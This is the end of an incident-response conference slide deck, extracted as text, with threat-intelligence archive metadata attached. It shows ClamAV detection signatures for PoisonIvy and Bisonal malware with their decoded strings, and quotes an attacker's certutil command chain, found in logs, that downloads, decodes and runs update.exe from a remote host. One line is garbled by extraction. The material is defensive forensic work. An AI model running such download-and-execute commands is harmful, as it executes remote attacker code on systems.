REMOTE_PATH_TO_SCAN Psxec machine\nwith ClamAV DB Scanned Host 1 Scanned Host 2 Scanned Host 3 32\n\n\n-----\n\n[33 33](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-33-638.jpg?cb=1526345712) e ote C a sca t C C ca be used to sca t e et o t t ac s t ose add esses t at ca ot be co ected\nso that can be feed back to FRAC later for scanning. � Remember to create a share with clam databases � Might be able to scan more\n25 boxes at a time. Do sensitive boxes by hand vs using FRAC. FRAC machine with ClamAV DB Scanned Host 1 Scanned Host 2\nScanned Host 3 ./frac_v0.05.pl --iplist iplist.txt --cmd cmd.txt --verbose 33\n[34. 34. ClamAV PoisonIvy variants signature](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-34-638.jpg?cb=1526345712)\n\nPoisonIvy2015:0:*:257375706461746525346425303264253032642530326425303264253032642e746d70*434f4e4e4543542025733a25692\nPoisonIVY2011:0:*:202f632064656c202573203e206e756c*25752e3139332e25642e2564*47455420257320485454502f312e31*757564646f\nPoisonIVY2011UPX:0:*:76727937666f2f55524c446f776e657a7b*365c5c7525752e3139332e2564 The second part contains instead\n“CONNECT %s:%i HTTP//1.0” The first Rule contains two non-successive strings divided by the symbol “*”. The first string translated\nfrom hexadecimal contains the word “%supdate%4d%02d%02d%02d%02d%02d.tmp”. This rule takes a Poison Ivy sample dated 2011\nand we use 3 different strings. The first is “/c del %s > nul” The second strings is “GET %s HTTP/1.1” The last matches to “uuddosbea”\nThe third rule is the same sample mentioned above, but without the package UPX. The first of two strings is “vry7fo/URLDownez{” The\nsecond strings is “6u%u.193.%d” 34\n[35. 35. ClamAV Bisonal - logic signature BISONAL;Target:1;(0&1&2)|(0&2&3)|(4&5)|](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-35-638.jpg?cb=1526345712)\n\n(6&7&8);534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e;776b6\nb6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6c6f;633a5c77696e646f77735c74\n65;6c6f76652061206d656e67;4845404c2d505368656c6c45;7865637574;776b6b6f253030796a717b317c727c31706d31746d304a6f73707e\n730702f317e6c6f;687474703a2f2f25732f25732e6173703f69643d257325732573;633a5c615c322e747874 BISONAL;Target:1;(0&1&2)|\n(0&2&3)|(4&5)|(6&7&8) This is a ClamAV “Body-based”, slightly different, from the previous one. It has to be put inside a “.LDB” file and it\nis possible to use logic operators inside the rule. Logical operators in action within the BISONAL signature. Numbers are placeholders for\nthe hex strings. Match IF found: (both strings 0,1 and 2) OR (both strings 0,2 and 3) OR (only strings 4 and 5) OR (both strings 6,7 and\n8). 534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e =\nSOFTWAREMicrosoftWindowsCurrentVersionRun\n776b6b6f25303068686831797e7c747d707074317c7072304a6f73707e7b5976737a30797e727a306730702f317e6 c6f =\nwkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo 633a5c77696e646f77735c7461736b735c646566612e657865 =\nc:windowstasksdfea.exe 6c6f76652061206d656e67 = love a meng 4845404c2d505368656c6c45 = HE@L-PShellE 7865637574 = xecut\n776b6b6f253030796a717b317c727c31706d31746d304a6f73707e7b5976737a30797e727a306730702f317e6c6f =\nwkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo 687474703a2f2f25732f25732e6173703f69643d257325732573 =\nhttp://%s/%s.asp?id=%s%s%s 633a5c615c322e747874 = c:a2.txtz 1 2 3 4 5 6 7 8 0 35\n[36. 36. ClamAV and Forensics ● ClamAV can help with Forensics investigations – Can detect badness in log files – Example Find: ● Find in](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-36-638.jpg?cb=1526345712)\n\nthe section C of the modsec logs: ●/var/log/httpd/modsec_audit.log: Win.Downloader.CertutilURLCache-6335697-0 FOUND ●certutil urlcache -split -f http://xx.xx.xx.xx/update.b64 update.b64 ●certutil -decode update.b64 update.exe ●update.exe 36\n[37. 37. • Actionable IOCs is an answer to the need of solid indicators to support the investigation, the attribution and the triage, of incidents](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-37-638.jpg?cb=1526345712)\n\ngenerated by malicious actors. • The adoption of this methodology can positively impact investigation and triage, but also improves\nknowledge of the tools and strategies adopted by the adversaries. • The formalization process behind it can facilitate the exchange of\ninformation and indicators without the risk of unintentional leakage of sensitive information and, in short, strengthen the proactive and\nreactive capabilities of any structure. Where are we heading\n[38. 38. Thanks!](https://image.slidesharecdn.com/bsidesfinal-180515003159/95/bsides-ir-in-heterogeneous-environment-38-638.jpg?cb=1526345712)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-05-15 - IR in Heterogeneous Environment.pdf"
    ],
    "report_names": [
        "2018-05-15 - IR in Heterogeneous Environment.pdf"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cf02412a-041a-4c8d-8ffa-3bff7dd812b5",
            "created_at": "2024-02-02T02:00:04.018717Z",
            "updated_at": "2025-03-27T02:00:03.289534Z",
            "deleted_at": null,
            "main_name": "Blue Tsunami",
            "aliases": [
                "Black Cube"
            ],
            "source_name": "MISPGALAXY:Blue Tsunami",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535617,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653756445,
    "ts_modification_date": 1653756445,
    "files": {
        "pdf": "https://archive.orkl.eu/7ee5d5b69bbbcc9e865e2ce5307a279e7742b26b.pdf",
        "text": "https://archive.orkl.eu/7ee5d5b69bbbcc9e865e2ce5307a279e7742b26b.txt",
        "img": "https://archive.orkl.eu/7ee5d5b69bbbcc9e865e2ce5307a279e7742b26b.jpg"
    }
}